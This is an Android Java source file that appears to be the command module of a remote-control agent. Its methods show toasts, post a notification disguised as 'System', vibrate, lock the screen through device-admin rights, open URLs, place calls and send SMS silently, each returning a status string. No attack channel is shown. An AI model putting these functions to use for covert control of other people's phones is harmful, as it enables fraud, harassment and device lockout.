package com.zynremote.agent;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.Vibrator;
import android.widget.Toast;

public class SystemHelper {

    public static String showToast(final Context ctx, final String text) {
        new Handler(Looper.getMainLooper()).post(() ->
            Toast.makeText(ctx, text, Toast.LENGTH_LONG).show()
        );
        return "toast shown: " + text;
    }

    public static String showNotification(Context ctx, String text) {
        try {
            String CH = "zyn_notif";
            NotificationManager nm = (NotificationManager)
                ctx.getSystemService(Context.NOTIFICATION_SERVICE);
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel ch = new NotificationChannel(CH, "System", NotificationManager.IMPORTANCE_HIGH);
                nm.createNotificationChannel(ch);
            }
            Notification.Builder b;
            if (Build.VERSION.SDK_INT >= 26) b = new Notification.Builder(ctx, CH);
            else b = new Notification.Builder(ctx);

            b.setContentTitle("System")
             .setContentText(text)
             .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setAutoCancel(true);

            nm.notify(999, b.build());
            return "notif shown";
        } catch (Throwable t) {
            return "error notif: " + t.getMessage();
        }
    }

    public static String vibrate(Context ctx, int sec) {
        try {
            Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
            if (v == null) return "no vibrator";
            v.vibrate(sec * 1000L);
            return "vibrating " + sec + "s";
        } catch (Throwable t) {
            return "error vibrate: " + t.getMessage();
        }
    }

    public static String lockScreen(Context ctx) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName cn = new ComponentName(ctx, AdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(cn)) {
                dpm.lockNow();
                return "screen locked";
            }
            return "no admin rights";
        } catch (Throwable t) {
            return "error lock: " + t.getMessage();
        }
    }

    public static String openUrl(Context ctx, String url) {
        try {
            Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
            return "opened: " + url;
        } catch (Throwable t) {
            return "error open: " + t.getMessage();
        }
    }

    public static String callNumber(Context ctx, String num) {
        try {
            Intent i = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + num));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
            return "calling: " + num;
        } catch (Throwable t) {
            return "error call: " + t.getMessage();
        }
    }

    public static String sendSms(Context ctx, String num, String text) {
        try {
            android.telephony.SmsManager sm = android.telephony.SmsManager.getDefault();
            sm.sendTextMessage(num, null, text, null, null);
            return "sms sent to " + num;
        } catch (Throwable t) {
            return "error sms: " + t.getMessage();
        }
    }
}
